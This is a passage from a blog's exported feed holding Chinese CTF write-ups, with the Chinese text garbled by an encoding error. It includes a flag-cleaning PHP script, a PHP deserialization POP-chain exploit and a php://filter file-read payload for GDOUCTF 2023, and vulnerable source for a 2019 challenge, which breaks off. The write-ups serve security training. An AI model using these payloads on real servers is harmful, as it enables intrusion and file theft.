éœ€è¦çš„ä¸œè¥¿EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125; <br></code></pre></td></tr></table></figure><p>ç¼–å†™è„šæœ¬æŠŠé‡Œé¢å¤šä½™çš„åˆ é™¤ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&quot;EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:flWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:ag&#123;OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:salJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:lasjIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:lsdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:13-WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:mOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:ccJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJjsecret:abIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiisecret:obEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:2WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWsecret:4OOOOOOOOOOOOOOOOOOOOOOOOOsecret:zzJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:mkIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:bxEEEEEEEEEEEEEEEEEEEEEEEsecret:2-WWWWWWWWWWWWWWWsecret:zxOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:dsJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:gohIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:dsxEEEEEEEEEEEEEEEEEEEEEsecret:zxcWWWWWWWWWWWWsecret:zxwOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOosecret:0-JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:ddxIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zxwEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:12sWWWWWWWWWWWWWWWWsecret:dsxOOOOOOOOOOOOOOOOOOOOsecret:asxJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:zIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:zkEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:f-WWWWWWWWWWWWWWWWWWWWWWsecret:awOOOOOOOOOOOOsecret:xfJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJsecret:axdIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:amdEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:p2-WWWWWWWWWWWWWWsecret:xxOOOOOOOOOOOOOOOOOOOOOOOOsecret:zJJJJJJJJJJJJJJJJJJJJsecret:moIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIisecret:yhEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:aaWWWWWWWWWWWWsecret:tOOOOOOOOOOOOOOOOsecret:23JJJJJJJJJJJJJJJJJsecret:qw-IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:asdEEEEEEEEEEEEEEEEEEEEsecret:ghWWWWWWWWWWWWWWWWsecret:zxcOOOOOOOOOOOOOOOOOOOOOOOOOOOOOsecret:22JJJJJJJJJJJJJJJJJJJJJJsecret:czxcIIIIIIIIIIIIIIIIIIIIIIIIIIsecret:owmEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEsecret:231WWWWWWWWWWWWWsecret:bye!&#125;&quot;</span>;<br><span class="hljs-variable">$pat</span> = <span class="hljs-string">&quot;/secret:|[EWOJI]/&quot;</span>;<br><span class="hljs-variable">$re</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pat</span>, <span class="hljs-variable">$re</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬æ‹¿åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-competition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€GDOUCTF 2023ã€‘åæ–¹å‘çš„é’Ÿ</title>
    <link href="/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/"/>
    <url>/2024/08/13/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    
    <content type="html"><![CDATA[<p><strong>ååºåˆ—åŒ–é¢˜ç›®ä¸Šæ¥å°±æ˜¯ç»å…¸æºç å±•ç¤º</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜åˆ†æä¸æ˜¯å¾ˆéš¾æˆ‘ä¸»è¦æ˜¯æƒ³è®°å½•ä¸€ä¸‹åŸç”Ÿç±»çš„é—®é¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span> = <span class="hljs-string">&#x27;department&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span> = <span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$a</span>-&gt;department = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$a</span>-&gt;department-&gt;leader = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜æ‰“å¼€ä¸€çœ¼å°±èƒ½çœ‹è§ä¸¤ä¸ªå¯æ§çš„POSTä¼ å‚å˜é‡ï¼Œpopé“¾ä¹Ÿä¸éš¾æ‰€ä»¥å°±ç›´æ¥å±•ç¤ºpayloadäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a=<span class="hljs-built_in">SplFileObject</span>&amp;b=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®ç”¨åˆ°äº†ä¸€ä¸ªphpçš„åŸç”Ÿç±»å«<code>SplFileObject</code><br>è¿™ä¸ªç±»çš„ä½œç”¨æ˜¯è¯»å–æ–‡ä»¶<br><strong>æ ¹æ®å®˜æ–¹æ–‡æ¡£:</strong></p><ul><li><strong>SplFileInfo ç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œ</strong></li></ul><p><strong>ä¸¾ä¸ªä¾‹å­</strong><br>æˆ‘åˆ›å»ºäº†ä¸€ä¸ªa.phpå†…å®¹æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test&#x27;</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘åœ¨åŒç›®å½•ä¸‹åˆ›å»ºäº†ä¸€ä¸ªphpæ–‡ä»¶åˆ©ç”¨åŸç”Ÿç±»è¯»å–a.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;a.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœå°±æ˜¯åªå›æ˜¾äº†ç¬¬ä¸€è¡Œçš„å†…å®¹<br>è¿™ä¸ªæ—¶å€™å°±åªèƒ½ä½¿ç”¨phpä¼ªåè®®æ¥è¯»å–a.phpçš„å†…å®¹äº†</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfwp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€å®‰æ´µæ¯ 2019ã€‘easy_serialize_php</title>
    <link href="/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/"/>
    <url>/2024/08/11/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php/</url>
    
    <content type="html"><![CDATA[<p><strong>è¿™æ˜¯ä¸€é“å­—ç¬¦ä¸²å‡å°‘çš„é¢˜ç›®å€¼å¾—ä¸€åš</strong><br>è¿›æ¥å°±æ˜¯æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-comment">//æŠŠè¯†åˆ«åˆ°çš„å­—ç¬¦æ¢æˆäº†ç©ºå­—ç¬¦</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-comment">//æ¸…æ¥š$_SESSIONçš„å†…å®¹</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-comment">//ç»™$_SESSION[&#x27;img&#x27;]èµ‹å€¼</span><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-comment">//çœ‹åˆ°è¿™é‡Œåº”è¯¥å°±èƒ½ååº”è¿‡æ¥æ˜¯å­—ç¬¦ä¸²å‡å°‘çš„é¢˜ç›®</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡æ³¨æ„åˆ°æœ‰ä¸ç†Ÿæ‚‰çš„ç©æ„<code>$_SESSION</code>å’Œ<code>extract()</code><br><code>$_SESSION</code>å˜é‡<br>ä½œç”¨æ˜¯è®¿å®¢ä¸æ•´ä¸ªç½‘ç«™äº¤äº’è¿‡ç¨‹ä¸­ä¸€ç›´å­˜åœ¨çš„å…¬æœ‰å˜é‡<br><code>extract()</code> 